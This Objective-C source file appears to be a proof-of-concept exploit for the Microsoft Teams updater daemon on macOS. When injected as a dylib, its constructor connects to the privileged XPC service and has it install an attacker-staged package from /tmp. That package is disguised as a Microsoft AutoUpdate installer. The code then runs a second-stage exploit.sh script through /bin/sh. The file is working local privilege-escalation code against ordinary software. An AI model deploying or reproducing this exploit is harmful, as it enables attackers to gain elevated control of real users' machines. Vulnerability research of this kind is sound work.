#import <Foundation/Foundation.h>

@protocol TeamsUpdaterDaemonProtocol
- (void)installUpdateWithPackage:(NSString *)arg1 withPreferences:(NSDictionary *)arg2 andOptions:(NSString *)arg3 withReply:(void (^)(NSString *))arg4;
- (void)ping:(void (^)(void))arg1;
@end

static void installPackage(void) {
    NSString* _serviceName = @"com.microsoft.teams.TeamsUpdaterDaemon";
    
    NSLog(@"[*] Connecting to XPC service");
    
    NSXPCConnection* _agentConnection = [[NSXPCConnection alloc] initWithMachServiceName:_serviceName options:4096];
        [_agentConnection setRemoteObjectInterface:[NSXPCInterface interfaceWithProtocol:@protocol(TeamsUpdaterDaemonProtocol)]];
        [_agentConnection resume];
        
    id obj = [_agentConnection remoteObjectProxyWithErrorHandler:^(NSError *err) {
        NSLog(@"[!] Error: %@", err);
    }];
        
    NSLog(@"[*] XPC Obj: %@", obj);
    
    NSLog(@"[*] Installing package");
    
    NSString* package = @"/tmp/msteams/stage1/Microsoft_AutoUpdate_4.19.20011301_Updater.pkg";

    NSDictionary *dict = [NSDictionary dictionaryWithObjects:@[@"48fe48cc-1c3a-4bf8-a731-1947150b4a3f",NSUserName()]

    forKeys:@[@"TeamsPreferenceCorrelationId",@"TeamsPreferenceUsername"]];

    [obj installUpdateWithPackage:package withPreferences:dict andOptions:nil withReply:^(NSString* arg3) {
        NSLog(@"[*] Reply: %@",arg3);
    }];
    
    NSLog(@"[*] Package installed");
    
    return;
}

static NSString *runCommand(NSString * commandToRun)
{
    NSTask *task = [[NSTask alloc] init];
    [task setLaunchPath:@"/bin/sh"];

    NSArray *arguments = [NSArray arrayWithObjects:
                          @"-c" ,
                          [NSString stringWithFormat:@"%@", commandToRun],
                          nil];
    NSLog(@"[*] Command: %@", commandToRun);
    [task setArguments:arguments];

    NSPipe *pipe = [NSPipe pipe];
    [task setStandardOutput:pipe];

    NSFileHandle *file = [pipe fileHandleForReading];

    [task launch];

    NSData *data = [file readDataToEndOfFile];

    NSString *output = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
    
    return output;
}

static void exploitPackage(void) {
    NSLog(@"[*] Exploiting package");
    
    NSLog(@"[*] Waiting... (10s)");
    
    sleep(10);
    
    NSString *output = runCommand(@"bash ./stage2/exploit.sh");
    
    NSLog(@"[*] Command output: %@", output);
    
    return;
}

__attribute__((constructor))

static void startExploit(int argc, const char **argv) {
    NSLog(@"[*] Injected dylib");
    installPackage();
    exploitPackage();
    NSLog(@"[*] Done");
    
    return;
}

